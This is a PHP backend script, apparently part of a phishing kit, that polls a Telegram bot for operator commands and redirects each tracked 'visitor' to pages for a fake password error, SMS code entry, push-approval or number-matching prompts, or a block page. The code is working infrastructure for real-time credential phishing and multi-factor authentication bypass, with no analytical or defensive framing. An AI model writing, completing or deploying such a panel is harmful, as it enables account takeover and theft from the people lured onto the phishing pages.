<?php
// Start output buffering
ob_start();

// Include configuration and database helper
require_once(__DIR__ . '/config.php');
require_once(__DIR__ . '/session/database.php');

// Set maximum execution time
set_time_limit(30);

$start_time = microtime(true);

// Get updates from Telegram
$offset_file = __DIR__ . '/session/last_update_id.txt';
$offset = 0;

// Use file locking for the offset file to prevent multiple concurrent polls
$fp = fopen($offset_file, "c+");
if (!$fp) {
    header('Content-Type: application/json');
    ob_end_clean();
    echo json_encode(['status' => 'error', 'message' => 'Could not open offset file']);
    exit;
}

// Acquire exclusive lock
if (!flock($fp, LOCK_EX | LOCK_NB)) {
    // If we can't get the lock, another process is already polling
    fclose($fp);
    header('Content-Type: application/json');
    ob_end_clean();
    echo json_encode(['status' => 'busy', 'message' => 'Another poll is in progress']);
    exit;
}

$offset_content = fread($fp, 1024);
if (!empty($offset_content)) {
    $offset = (int)$offset_content + 1;
}

$website = "https://api.telegram.org/bot{$settings['bot_url']}";
$url = $website . "/getUpdates?offset={$offset}&timeout=5"; // Reduced timeout for shared polling

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$response = curl_exec($ch);
$curl_error = curl_error($ch);
curl_close($ch);

if ($response === false) {
    flock($fp, LOCK_UN);
    fclose($fp);
    header('Content-Type: application/json');
    ob_end_clean();
    echo json_encode(['status' => 'error', 'message' => 'Curl error: ' . $curl_error]);
    exit;
}

$updates = json_decode($response, true);

if (!$updates || !isset($updates['result']) || empty($updates['result'])) {
    flock($fp, LOCK_UN);
    fclose($fp);
    header('Content-Type: application/json');
    ob_end_clean();
    echo json_encode(['status' => 'no_updates']);
    exit;
}

$processed_count = 0;
$last_update_id = $offset - 1;

foreach ($updates['result'] as $update) {
    if (isset($update['update_id'])) {
        $last_update_id = $update['update_id'];
    }
    
    if (!isset($update['callback_query'])) {
        continue;
    }

    $callback_query = $update['callback_query'];
    $chat_id = $callback_query['message']['chat']['id'];
    $message_id = $callback_query['message']['message_id'];
    $callback_id = $callback_query['id'];
    $data = $callback_query['data'];

    // Extract visitor ID from message text
    // Support multiple formats including hex and test IDs
    if (preg_match('/Visitor ID: ([\w\-]+)/', $callback_query['message']['text'], $matches)) {
        $visitor_id = $matches[1];
    } else {
        // Fallback: search for any sequence that looks like a visitor ID if the label was missed
        if (preg_match('/([a-f0-9]{32,64})/', $callback_query['message']['text'], $matches)) {
            $visitor_id = $matches[1];
        } else {
            error_log("No visitor ID found in message: " . $callback_query['message']['text']);
            continue;
        }
    }

    $redirect_url = "";
    $status_label = "";

    // Handle number selection specifically
    if (preg_match('/^number_(\d+)$/', $data, $matches)) {
        $number = $matches[1];
        $redirect_url = "prompt-numb.php?id=" . $visitor_id . "&number=" . $number;
        $status_label = "📞 Number Prompt #" . $number;
    } else {
        switch($data) {
            case 'number_prompt':
                // Update keyboard to show number selection
                $numbers = [];
                $row = [];
                for ($i = 1; $i <= 99; $i++) {
                   $row[] = ['text' => (string)$i, 'callback_data' => 'number_' . $i];
                   if (count($row) == 8) { 
                       $numbers[] = $row; 
                       $row = []; 
                   }
                }
                // Add the 100th button as the "Back" button
                if (!empty($row)) {
                    $row[] = ['text' => '↩️ Back', 'callback_data' => 'back_to_main'];
                    $numbers[] = $row;
                } else {
                    $numbers[] = [['text' => '↩️ Back', 'callback_data' => 'back_to_main']];
                }
                
                $edit_markup = [
                    'chat_id' => $chat_id,
                    'message_id' => $message_id,
                    'reply_markup' => json_encode(['inline_keyboard' => $numbers])
                ];
                
                $ch = curl_init($website . '/editMessageReplyMarkup');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($edit_markup));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_exec($ch);
                curl_close($ch);
                break;

            case 'back_to_main':
                // Restore main keyboard
                $keyboard = [
                    'inline_keyboard' => [
                        [['text' => '🔒 Security Preference', 'callback_data' => 'security_preference']],
                        [
                            ['text' => '✅ Yes Prompt', 'callback_data' => 'yes_prompt'],
                            ['text' => '📱 SMS Code I', 'callback_data' => 'sms1']
                        ],
                        [
                            ['text' => '📱 SMS Code II', 'callback_data' => 'sms2'],
                            ['text' => '📞 Number Prompt', 'callback_data' => 'number_prompt']
                        ],
                        [
                            ['text' => '❌ Password Error', 'callback_data' => 'password_error'],
                            ['text' => '🚫 Block Visitor', 'callback_data' => 'block']
                        ],
                        [['text' => '✅ Success', 'callback_data' => 'success']]
                    ]
                ];
                $edit_markup = [
                    'chat_id' => $chat_id,
                    'message_id' => $message_id,
                    'reply_markup' => json_encode($keyboard)
                ];
                $ch = curl_init($website . '/editMessageReplyMarkup');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($edit_markup));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_exec($ch);
                curl_close($ch);
                break;

            case 'yes_prompt':
                $redirect_url = "prompt-yes.php?id=" . $visitor_id;
                $status_label = "✅ Yes/No Prompt";
                break;
            case 'password_error':
                $redirect_url = "error.php?id=" . $visitor_id;
                $status_label = "❌ Password Error";
                break;
            case 'sms1':
                $redirect_url = "auth.php?id=" . $visitor_id;
                $status_label = "📱 SMS Code I";
                break;
            case 'sms2':
                $redirect_url = "erauth.php?id=" . $visitor_id;
                $status_label = "📱 SMS Code II";
                break;
            case 'security_preference':
                $redirect_url = "select.php?id=" . $visitor_id;
                $status_label = "🔒 Security Preference";
                break;
            case 'block':
                $redirect_url = "blocked.php?id=" . $visitor_id;
                $status_label = "🚫 Blocked";
                break;
            case 'success':
                $redirect_url = "unsupported.html";
                $status_label = "🚫 Unsupported";
                break;
        }
    }

    if (!empty($redirect_url)) {
        // Update database
        db_update_visitor($visitor_id, [
            'status' => 'ready',
            'redirect_url' => $redirect_url
        ]);

        // Answer callback with alert
        $answer = [
            'callback_query_id' => $callback_id,
            'text' => "✅ Action Executed: {$status_label}",
            'show_alert' => true
        ];
        
        $ch = curl_init($website . '/answerCallbackQuery');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($answer));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
        
        $processed_count++;
    } else if (in_array($data, ['number_prompt', 'back_to_main'])) {
        // Just answer the callback so the spinner stops
        $answer = ['callback_query_id' => $callback_id];
        $ch = curl_init($website . '/answerCallbackQuery');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($answer));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
}

// Save last update ID and unlock
if ($last_update_id >= $offset - 1) {
    ftruncate($fp, 0);
    rewind($fp);
    fwrite($fp, (string)$last_update_id);
}
flock($fp, LOCK_UN);
fclose($fp);

header('Content-Type: application/json');
ob_end_clean();
echo json_encode([
    'status' => 'success',
    'processed' => $processed_count,
    'execution_time' => (microtime(true) - $start_time)
]);
exit;